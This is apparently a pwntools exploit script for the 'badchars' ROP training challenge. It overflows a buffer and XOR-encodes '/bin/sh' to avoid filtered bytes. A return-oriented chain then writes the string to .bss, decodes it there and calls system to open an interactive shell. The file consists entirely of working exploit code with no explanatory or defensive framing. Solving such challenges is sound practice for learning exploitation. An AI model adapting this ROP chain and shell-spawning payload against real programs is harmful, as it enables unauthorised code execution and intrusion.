from pwn import *

p = process("./badchars")
context.log_level = "debug"

sys_addr = 0x004006f0
bss_addr = 0x0000000000601080
#data_addr cannot be use. it will input "/bil/sh".i don't know why this time.
pop_r12_r13 = 0x0000000000400b3b
mov_r13p_r12 = 0x0000000000400b34
pop_r14_r15 = 0x0000000000400b40
xor_r15_r14 = 0x0000000000400b30
pop_rdi = 0x0000000000400b39
binsh = "/bin/sh\x00"
xorbinsh = ""

for i in binsh:
	xorbinsh += chr(ord(i)^2)

payload = ''
payload += "A"*40
payload += p64(pop_r12_r13)
payload += xorbinsh
payload += p64(bss_addr)
payload += p64(mov_r13p_r12)

for x in range(len(xorbinsh)):
	payload += p64(pop_r14_r15)
	payload += p64(2)
	payload += p64(bss_addr + x)
	payload += p64(xor_r15_r14)

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(sys_addr)

p.sendline(payload)
p.interactive()
